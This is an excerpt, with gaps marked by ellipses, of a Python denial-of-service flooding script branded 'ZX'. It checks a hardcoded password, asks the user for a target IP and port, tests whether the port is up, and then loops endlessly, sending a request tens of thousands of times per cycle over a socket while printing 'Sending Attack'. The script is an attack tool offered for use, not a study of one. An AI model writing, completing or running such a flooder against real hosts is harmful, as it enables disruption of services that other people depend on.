...
import sys
os.system("color 5")
os.system(f"title Create By ZX")
ZX = "ZX"

for i in range(3):
    pwd = input("[ZX] Password Require: ")
    j = 3
    if (pwd == ZX):
        print("[ZX] Checking Password [ZX]\n")
        break
    else:
        time.sleep(5)
        print("[ZX] Invalid Password [ZX]\n")
        continue
time.sleep(2)
print("[ZX] successfully login [ZX]")
time.sleep(2)
...
os.system("cls")
print("Please Use Cloud Shell")
print("|--------------------------------------------------------------------------|")
print("Tools Created From Sky")
print("|--------------------------------------------------------------------------|")
print("Credit : DapaZX")
print("|--------------------------------------------------------------------------|")

print()
ip = str(input("[ZX] Input IP: "))
port = int(input("[ZX] Port: "))
...
def tcpping(ip,port):
    try:
        ...
        print(f"[ZX] Connection {ip} on {port} its up!!!")
        time.sleep(3)
    except:
        print(f"[ZX] Connection {ip} on {port} its down!!!")
        time.sleep(3)
    ...
    while True:
        try:
            ...
            for x in range(60000):
                ...
                s.sendall(str.encode(request))
                s.sendall(str.encode(request))
            print(i +"[ZX] Sending Attack [ZX]")
        except socket.error:
            s.close()
            print("[ZX] Attack",ip,":",port,"[ZX]")
